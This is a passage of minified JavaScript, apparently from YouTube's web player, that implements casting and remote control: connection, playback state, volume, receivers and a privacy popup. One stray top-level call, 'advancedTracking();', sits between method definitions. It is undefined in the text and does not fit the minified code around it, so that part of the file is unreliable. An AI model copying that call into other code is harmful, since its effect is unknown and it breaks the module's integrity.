    if ((a != this.C || 2 == a) && 3 != this.C && 0 != a) {
      var b = this.C;
      this.C = a;
      this.oa("proxyStateChange", b, a);
      if (1 == a) for (; !this.G.isEmpty();) b = a = this.G, 0 === b.j.length && (b.j = b.B, b.j.reverse(), b.B = []), a.j.pop().apply(this);else 3 == a && this.dispose();
    }
  };
  g.k.S9 = function (a, b) {
    this.oa(a, b);
  };
  g.k.J8 = function (a) {
    if (!a) this.yE(null), K9(this, null);else if (this.B.receiver.volume) {
      a = this.B.receiver.volume;
      var b = M9(this),
        c = Math.round(100 * a.level || 0);
      if (b.volume != c || b.muted != a.muted) c9("Cast volume update: " + a.level + (a.muted ? " muted" : "")), b.volume = c, b.muted = !!a.muted, P9(this, b);
    }
  };
  g.k.yE = function (a) {
    c9("Cast media: " + !!a);
    this.j && this.j.removeUpdateListener(this.Z);
    if (this.j = a) this.j.addUpdateListener(this.Z), iBb(this), this.oa("remotePlayerChange");
  };
  g.k.I8 = function (a) {
    a ? (iBb(this), this.oa("remotePlayerChange")) : this.yE(null);
  };
  g.k.hS = function () {
    Q9(this, "sendDebugCommand", {
      debugCommand: "stats4nerds "
    });
  };
  g.k.M8 = function () {
    var a = aBb();
    a && K9(this, a);
  };
  g.k.dg = function (a) {
    b9("CP", a);
  };
  g.w(U9, g.TF);
  g.k = U9.prototype;
  g.k.connect = function (a, b) {
    if (b) {
      var c = b.listId,
        d = b.videoId,
        e = b.videoIds,
        f = b.playerParams,
        h = b.clickTrackingParams,
        l = b.index,
        m = {
          videoId: d
        },
        n = b.currentTime,
        p = b.locationInfo;
      b = b.loopMode;
      void 0 !== n && (m.currentTime = 5 >= n ? 0 : n);
      f && (m.playerParams = f);
      p && (m.locationInfo = p);
      h && (m.clickTrackingParams = h);
      c && (m.listId = c);
      e && 0 < e.length && (m.videoIds = e.join(","));
      void 0 !== l && (m.currentIndex = l);
      this.Ka && (m.loopMode = b || "LOOP_MODE_OFF");
      c && (this.j.listId = c);
      this.j.videoId = d;
      this.j.index = l || 0;
      this.j.state = 3;
      H9(this.j, n);
      this.G = "UNSUPPORTED";
      c = this.Ka ? "setInitialState" : "setPlaylist";
      S9("Connecting with " + c + " and params: " + g.Mm(m));
      this.B.connect({
        method: c,
        params: g.Mm(m)
      }, a, Lxb());
    } else S9("Connecting without params"), this.B.connect({}, a, Lxb());
    mBb(this);
  };
  g.k.Jr = function (a) {
    this.B.Jr(a);
  };
  g.k.dispose = function () {
    this.isDisposed() || (g.Sa("yt.mdx.remote.remoteClient_", null), this.oa("beforeDispose"), T9(this, 3));
    g.TF.prototype.dispose.call(this);
  };
  g.k.ya = function () {
    nBb(this);
    pBb(this);
    oBb(this);
    g.TB(this.Z);
    this.Z = NaN;
    g.TB(this.Y);
    this.Y = NaN;
    this.D = null;
    g.FC(this.ma);
    this.ma.length = 0;
    this.B.dispose();
    g.TF.prototype.ya.call(this);
    this.G = this.N = this.C = this.j = this.B = null;
  };
  g.k.CX = function (a) {
    if (!this.C || 0 === this.C.length) return !1;
    for (var b = g.v(this.C), c = b.next(); !c.done; c = b.next()) if (!c.value.capabilities.has(a)) return !1;
    return !0;
  };
  g.k.o6 = function () {
    var a = 3;
    this.isDisposed() || (a = 0, isNaN(this.ED()) ? this.B.Mz() && isNaN(this.K) && (a = 1) : a = 2);
    return a;
  };
  g.k.jz = function (a) {
    S9("Disconnecting with " + a);
    g.Sa("yt.mdx.remote.remoteClient_", null);
    nBb(this);
    this.oa("beforeDisconnect", a);
    1 == a && k8();
    this.B.disconnect(a);
    this.dispose();
  };
  g.k.k6 = function () {
    var a = this.j;
    this.D && (a = this.j.clone(), J9(a, this.D, a.index));
    return eBb(a);
  };
  g.k.qba = function (a) {
    var b = this,
      c = new F9(a);
    c.videoId && c.videoId != this.j.videoId && (this.D = c.videoId, g.TB(this.Z), this.Z = g.RB(function () {
      if (b.D) {
        var e = b.D;
        b.D = null;
        b.j.videoId != e && V9(b, "getNowPlaying");
      }
    }, 5E3));
    var d = [];
    this.j.listId == c.listId && this.j.videoId == c.videoId && this.j.index == c.index || d.push("remoteQueueChange");
    this.j.playerState == c.playerState && this.j.volume == c.volume && this.j.muted == c.muted && I9(this.j) == I9(c) && g.Mm(this.j.trackData) == g.Mm(c.trackData) || d.push("remotePlayerChange");
    this.j.reset(a);
    g.cc(d, function (e) {
      this.oa(e);
    }, this);
  };
  g.k.DW = function () {
    var a = this.B.Ys(),
      b = g.zb(this.C, function (c) {
        return "REMOTE_CONTROL" == c.type && c.id != a;
      });
    return b ? b.id : "";
  };
  g.k.ED = function () {
    return this.B.nt();
  };
  g.k.V5 = function () {
    return this.G || "UNSUPPORTED";
  };
  g.k.W5 = function () {
    return this.N || "";
  };
  g.k.M2 = function () {
    !isNaN(this.ED()) && this.B.Ww();
  };
  g.k.jba = function (a, b) {
    V9(this, a, b);
    rBb(this);
  };
  g.k.zT = function () {
    var a = g.fC("SID", "") || "",
      b = g.fC("SAPISID", "") || "",
      c = g.fC("__Secure-3PAPISID", "") || "";
    if (!a && !b && !c) return "";
    a = g.sg(g.rg(a), 2);
    b = g.sg(g.rg(b), 2);
    c = g.sg(g.rg(c), 2);
    return g.sg(g.rg(a + "," + b + "," + c), 2);
  };
  U9.prototype.subscribe = U9.prototype.subscribe;
  U9.prototype.unsubscribeByKey = U9.prototype.Bh;
  U9.prototype.getProxyState = U9.prototype.o6;
  U9.prototype.disconnect = U9.prototype.jz;
  U9.prototype.getPlayerContextData = U9.prototype.k6;
  U9.prototype.setPlayerContextData = U9.prototype.qba;
  U9.prototype.getOtherConnectedRemoteId = U9.prototype.DW;
  U9.prototype.getReconnectTimeout = U9.prototype.ED;
  U9.prototype.getAutoplayMode = U9.prototype.V5;
  U9.prototype.getAutoplayVideoId = U9.prototype.W5;
  U9.prototype.reconnect = U9.prototype.M2;
  U9.prototype.sendMessage = U9.prototype.jba;
  U9.prototype.getXsrfToken = U9.prototype.zT;
  U9.prototype.isCapabilitySupportedOnConnectedDevices = U9.prototype.CX;
  g.w(DBb, g9);
  g.k = DBb.prototype;
  g.k.Lk = function (a) {
    return this.dh.$_gs(a);
  };
  g.k.contains = function (a) {
    return !!this.dh.$_c(a);
  };
  g.k.get = function (a) {
    return this.dh.$_g(a);
  };
  g.k.start = function () {
    this.dh.$_st();
  };
  g.k.add = function (a, b, c) {
    this.dh.$_a(a, b, c);
  };
  g.k.remove = function (a, b, c) {
    this.dh.$_r(a, b, c);
  };
  g.k.dL = function (a, b, c, d) {
    this.dh.$_un(a, b, c, d);
  };
  g.k.ya = function () {
    for (var a = 0, b = this.j.length; a < b; ++a) this.dh.$_ubk(this.j[a]);
    this.j.length = 0;
    this.dh = null;
    g9.prototype.ya.call(this);
  };
  g.k.N2 = function () {
    this.oa("screenChange");
  };
  g.k.A9 = function () {
    this.oa("onlineScreenChange");
  };
  l9.prototype.$_st = l9.prototype.start;
  l9.prototype.$_gspc = l9.prototype.H2;
  l9.prototype.$_gsppc = l9.prototype.vT;
  l9.prototype.$_c = l9.prototype.contains;
  l9.prototype.$_g = l9.prototype.get;
  l9.prototype.$_a = l9.prototype.add;
  l9.prototype.$_un = l9.prototype.dL;
  l9.prototype.$_r = l9.prototype.remove;
  l9.prototype.$_gs = l9.prototype.Lk;
  l9.prototype.$_gos = l9.prototype.uT;
  l9.prototype.$_s = l9.prototype.subscribe;
  l9.prototype.$_ubk = l9.prototype.Bh;
  var f$ = null,
    i$ = !1,
    W9 = null,
    X9 = null,
    OBb = null,
    a$ = [];
  g.w(TBb, g.J);
  g.k = TBb.prototype;
  g.k.ya = function () {
    g.J.prototype.ya.call(this);
    this.j.stop();
    this.B.stop();
    this.N.stop();
    var a = this.Fc;
    a.unsubscribe("proxyStateChange", this.hZ, this);
    a.unsubscribe("remotePlayerChange", this.EE, this);
    a.unsubscribe("remoteQueueChange", this.HJ, this);
    a.unsubscribe("previousNextChange", this.eZ, this);
    a.unsubscribe("nowAutoplaying", this.ZY, this);
    a.unsubscribe("autoplayDismissed", this.EY, this);
    this.Fc = this.module = null;
  };
  g.k.Qk = function (a) {
    var b = g.Ka.apply(1, arguments);
    if (2 != this.Fc.C) if (j$(this)) {
      if (1081 != M9(this.Fc).playerState || "control_seek" !== a) switch (a) {
        case "control_toggle_play_pause":
          M9(this.Fc).isPlaying() ? this.Fc.pause() : this.Fc.play();
          break;
        case "control_play":
          this.Fc.play();
          break;
        case "control_pause":
          this.Fc.pause();
          break;
        case "control_seek":
          this.K.CL(b[0], b[1]);
          break;
        case "control_subtitles_set_track":
          VBb(this, b[0]);
          break;
        case "control_set_audio_track":
          this.setAudioTrack(b[0]);
      }
    } else switch (a) {
      case "control_toggle_play_pause":
      case "control_play":
      case "control_pause":
        b = this.J.getCurrentTime();
        k$(this, 0 === b ? void 0 : b);
        break;
      case "control_seek":
        k$(this, b[0]);
        break;
      case "control_subtitles_set_track":
        VBb(this, b[0]);
        break;
      case "control_set_audio_track":
        this.setAudioTrack(b[0]);
    }
  };
  g.k.G8 = function (a) {
    this.N.d2(a);
  };
  g.k.nca = function (a) {
    this.Qk("control_subtitles_set_track", g.jd(a) ? null : a);
  };
  g.k.J_ = function () {
    var a = this.J.getOption("captions", "track");
    g.jd(a) || VBb(this, a);
  };
  g.k.Gc = function (a) {
    this.module.Gc(a, this.J.getVideoData().lengthSeconds);
  };
  g.k.l9 = function () {
    g.jd(this.C) || WBb(this, this.C);
    this.D = !1;
  };
  g.k.hZ = function (a, b) {
    this.B.stop();
    2 === b && this.A_();
  };
  g.k.EE = function () {
    if (j$(this)) {
      this.j.stop();
      var a = M9(this.Fc);
      switch (a.playerState) {
        case 1080:
        case 1081:
        case 1084:
        case 1085:
          this.module.Nh = 1;
          break;
        case 1082:
        case 1083:
          this.module.Nh = 0;
          break;
        default:
          this.module.Nh = -1;
      }
      switch (a.playerState) {
        case 1081:
        case 1:
          this.xc(new g.AL(8));
          this.z_();
          break;
        case 1085:
        case 3:
          this.xc(new g.AL(9));
          break;
        case 1083:
        case 0:
          this.xc(new g.AL(2));
          this.K.stop();
          this.Gc(this.J.getVideoData().lengthSeconds);
          break;
        case 1084:
          this.xc(new g.AL(4));
          break;
        case 2:
          this.xc(new g.AL(4));
          this.Gc(I9(a));
          break;
        case -1:
          this.xc(new g.AL(64));
          break;
        case -1E3:
          this.xc(new g.AL(128, {
            errorCode: "mdx.remoteerror",
            errorMessage: "This video is not available for remote playback.",
            BH: 2
          }));
      }
      a = M9(this.Fc).trackData;
      var b = this.C;
      (a || b ? a && b && a.trackName == b.trackName && a.languageCode == b.languageCode && a.languageName == b.languageName && a.kind == b.kind : 1) || (this.C = a, WBb(this, a));
      a = M9(this.Fc);
      -1 === a.volume || Math.round(this.J.getVolume()) === a.volume && this.J.isMuted() === a.muted || this.Z.isActive() || this.t0();
    } else UBb(this);
  };
  g.k.eZ = function () {
    this.J.oa("mdxpreviousnextchange");
  };
  g.k.HJ = function () {
    j$(this) || UBb(this);
  };
  g.k.ZY = function (a) {
    isNaN(a) || this.J.oa("mdxnowautoplaying", a);
  };
  g.k.EY = function () {
    this.J.oa("mdxautoplaycanceled");
  };
  g.k.setAudioTrack = function (a) {
    j$(this) && this.Fc.setAudioTrack(this.J.getVideoData(1).videoId, a);
  };
  g.k.seekTo = function (a, b) {
    -1 === M9(this.Fc).playerState ? k$(this, a) : b && this.Fc.seekTo(a);
  };
  g.k.t0 = function () {
    var a = this;
    if (j$(this)) {
      var b = M9(this.Fc);
      this.events.Mc(this.Y);
      b.muted ? this.J.mute() : this.J.unMute();
      this.J.setVolume(b.volume);
      this.Y = this.events.T(this.J, "onVolumeChange", function (c) {
        RBb(a, c);
      });
    }
  };
  g.k.z_ = function () {
    this.j.stop();
    if (!this.Fc.isDisposed()) {
      var a = M9(this.Fc);
      a.isPlaying() && this.xc(new g.AL(8));
      this.Gc(I9(a));
      this.j.start();
    }
  };
  g.k.A_ = function () {
    this.B.stop();
    this.j.stop();
    var a = this.Fc.nt();
    2 == this.Fc.C && !isNaN(a) && this.B.start();
  };
  g.k.xc = function (a) {
    this.B.stop();
    var b = this.G;
    if (!g.NBa(b, a)) {
      var c = g.JG(a, 2);
      c !== g.JG(this.G, 2) && this.J.uB(c);
      this.G = a;
      YBb(this.module, b, a);
    }
  };
  g.w(l$, g.V);
  l$.prototype.rd = function () {
    this.j.show();
  };
  l$.prototype.Pb = function () {
    this.j.hide();
  };
  l$.prototype.B = function () {
    m8("mdx-privacy-popup-cancel");
    this.Pb();
  };
  l$.prototype.C = function () {
    m8("mdx-privacy-popup-confirm");
    this.Pb();
  };
  g.w(m$, g.V);
  m$.prototype.onStateChange = function (a) {
    this.Dc(a.state);
  };
  m$.prototype.Dc = function (a) {
    if (3 === this.api.getPresentingPlayerType()) {
      var b = {
        RECEIVER_NAME: this.api.getOption("remote", "currentReceiver").name
      };
      a = g.JG(a, 128) ? g.dK("Error on $RECEIVER_NAME", b) : a.isPlaying() || a.isPaused() ? g.dK("Playing on $RECEIVER_NAME", b) : g.dK("Connected to $RECEIVER_NAME", b);
      this.updateValue("statustext", a);
      this.j.show();
    } else this.j.hide();
  };
  g.w(n$, g.xX);
  n$.prototype.D = function () {
    var a = this.J.getOption("remote", "receivers");
    a && 1 < a.length && !this.J.getOption("remote", "quickCast") ? (this.Zt = g.dc(a, this.j, this), g.yX(this, g.lr(a, this.j)), a = this.J.getOption("remote", "currentReceiver"), a = this.j(a), this.options[a] && this.Hj(a), this.enable(!0)) : this.enable(!1);
  };
  n$.prototype.j = function (a) {
    return a.key;
  };
  n$.prototype.Bk = function (a) {
    return "cast-selector-receiver" === a ? "Cast..." : this.Zt[a].name;
  };
  n$.prototype.kh = function (a) {
    g.xX.prototype.kh.call(this, a);
    this.J.setOption("remote", "currentReceiver", this.Zt[a]);
    this.Kb.Pb();
  };
  g.w(XBb, g.wV);
  g.k = XBb.prototype;
  g.k.create = function () {
    var a = this.player.U(),
      b = g.cS(a);
    a = {
      device: "Desktop",
      app: "youtube-desktop",
      loadCastApiSetupScript: a.L("mdx_load_cast_api_bootstrap_script"),
      enableDialLoungeToken: a.L("enable_dial_short_lived_lounge_token"),
      enableCastLoungeToken: a.L("enable_cast_short_lived_lounge_token")
    };
    IBb(b, a);
    this.subscriptions.push(g.CE("yt-remote-before-disconnect", this.E8, this));
    this.subscriptions.push(g.CE("yt-remote-connection-change", this.Y9, this));
    this.subscriptions.push(g.CE("yt-remote-receiver-availability-change", this.gZ, this));
    this.subscriptions.push(g.CE("yt-remote-auto-connect", this.W9, this));
    this.subscriptions.push(g.CE("yt-remote-receiver-resumed", this.V9, this));
    this.subscriptions.push(g.CE("mdx-privacy-popup-confirm", this.waa, this));
    this.subscriptions.push(g.CE("mdx-privacy-popup-cancel", this.vaa, this));
    this.gZ();
  };
  g.k.load = function () {
    this.player.cancelPlayback();
    g.wV.prototype.load.call(this);
    this.Sl = new TBb(this, this.player, this.Fc);
    var a = (a = QBb()) ? a.currentTime : 0;
    var b = NBb() ? new L9(e$(), void 0) : null;
    0 == a && b && (a = I9(M9(b)));
    0 !== a && this.Gc(a);
    YBb(this, this.gf, this.gf);
    this.player.bq(6);
  };
  g.k.unload = function () {
    this.player.oa("mdxautoplaycanceled");
    this.Ms = this.Np;
    g.tb(this.Sl, this.Fc);
    this.Fc = this.Sl = null;
    g.wV.prototype.unload.call(this);
    this.player.bq(5);
    o$(this);
  };
  g.k.ya = function () {
    g.DE(this.subscriptions);
    g.wV.prototype.ya.call(this);
  };
  g.k.AE = function (a) {
    var b = g.Ka.apply(1, arguments);
    this.loaded && this.Sl.Qk.apply(this.Sl, [a].concat(g.ra(b)));
  };
  g.k.getAdState = function () {
    return this.Nh;
  };
  g.k.Cp = function () {
    return this.Fc ? M9(this.Fc).Cp : !1;
  };
  g.k.Rk = function () {
    return this.Fc ? M9(this.Fc).Rk : !1;
  };
  g.k.Gc = function (a, b) {
    this.LX = a || 0;
    this.player.oa("progresssync", a, b);
    this.player.Qa("onVideoProgress", a || 0);
  };
  g.k.getCurrentTime = function () {
    return this.LX;
  };
  g.k.getProgressState = function () {
    var a = M9(this.Fc),
      b = this.player.getVideoData();
    return {
      airingStart: 0,
      airingEnd: 0,
      allowSeeking: 1081 != a.playerState && this.player.Mh(),
      clipEnd: b.clipEnd,
      clipStart: b.clipStart,
      current: this.getCurrentTime(),
      displayedStart: -1,
      duration: a.getDuration(),
      ingestionTime: a.B ? a.C + G9(a) : a.C,
      isAtLiveHead: 1 >= (a.B ? a.j + G9(a) : a.j) - this.getCurrentTime(),
      loaded: a.Z,
      seekableEnd: a.B ? a.j + G9(a) : a.j,
      seekableStart: 0 < a.D ? a.D + G9(a) : a.D,
      offset: 0,
      viewerLivestreamJoinMediaTime: 0
    };
  };
  g.k.nextVideo = function () {
    this.Fc && this.Fc.nextVideo();
  };
  g.k.XJ = function () {
    this.Fc && this.Fc.XJ();
  };
  advancedTracking();
  g.k.E8 = function (a) {
    1 === a && (this.QQ = this.Fc ? M9(this.Fc) : null);
  };
  g.k.Y9 = function () {
    var a = NBb() ? new L9(e$(), void 0) : null;
    if (a) {
      var b = this.Ms;
      this.loaded && this.unload();
      this.Fc = a;
      this.QQ = null;
      b.key !== this.Np.key && (this.Ms = b, this.load());
    } else g.sb(this.Fc), this.Fc = null, this.loaded && (this.unload(), (a = this.QQ) && a.videoId === this.player.getVideoData().videoId && this.player.cueVideoById(a.videoId, I9(a)));
    this.player.oa("videodatachange", "newdata", this.player.getVideoData(), 3);
  };
  g.k.gZ = function () {
    var a = [this.Np],
      b = a.concat,
      c = JBb();
    C9() && g.OC("yt-remote-cast-available") && c.push({
      key: "cast-selector-receiver",
      name: "Cast..."
    });
    this.Zt = b.call(a, c);
    a = LBb() || this.Np;
    p$(this, a);
    this.player.Qa("onMdxReceiversChange");
  };
  g.k.W9 = function () {
    var a = LBb();
    p$(this, a);
  };
  g.k.V9 = function () {
    this.Ms = LBb();
  };
  g.k.waa = function () {
    this.YE = !0;
    o$(this);
    i$ = !1;
    f$ && h$(f$, 1);
    f$ = null;
  };
  g.k.vaa = function () {
    this.YE = !1;
    o$(this);
    p$(this, this.Np);
    this.Ms = this.Np;
    i$ = !1;
    f$ = null;
    this.player.playVideo();
  };
  g.k.Dh = function (a, b) {
    switch (a) {
      case "casting":
        return this.loaded;
      case "receivers":
        return this.Zt;
      case "currentReceiver":
        return b && ("cast-selector-receiver" === b.key ? bBb() : p$(this, b)), this.loaded ? this.Ms : this.Np;
      case "quickCast":
        return 2 === this.Zt.length && "cast-selector-receiver" === this.Zt[1].key ? (b && bBb(), !0) : !1;
    }
  };
  g.k.hS = function () {
    this.Fc.hS();
  };
  g.k.Al = function () {
    return !1;
  };
  g.k.getOptions = function () {
    return ["casting", "receivers", "currentReceiver", "quickCast"];
  };
  g.k.isLoggedIn = function () {
    var a, b;
    return void 0 !== (null == (a = g.yB("PLAYER_CONFIG")) ? void 0 : null == (b = a.args) ? void 0 : b.authuser) ? !0 : !(!g.yB("SESSION_INDEX") && !g.yB("LOGGED_IN"));
  };
  g.vV("remote", XBb);
})(_yt_player);